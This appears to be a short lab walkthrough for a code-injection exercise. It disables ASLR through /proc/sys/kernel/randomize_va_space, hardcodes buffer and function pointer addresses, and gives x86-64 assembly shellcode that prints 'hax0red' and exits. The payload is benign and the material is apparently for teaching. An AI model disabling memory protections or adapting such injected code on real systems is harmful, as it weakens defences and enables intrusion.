
Step1. 
    Packages needed to be installed: sudo apt install nasm

Step2. 
    Disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

Step3. 
    Change the address of buffer_ptr to 0x555555755040, Change the address of func_ptr to 0x555555755140, then the demo can work as correctly.

Step4. 
    Implement the “print” command in the attack.asm (refer to Syscall numbers). 
    
    mov rax,1
    mov rdi,1
    mov rsi,(buffer_ptr+message-$$)
    mov rdx,message_len
    syscall
    
    message db "hax0red"
    message_len equ $-message

    mov rax,60
    mov rdi,5
    syscall

Step5. 
    Make and run demo, attack gets succeed.
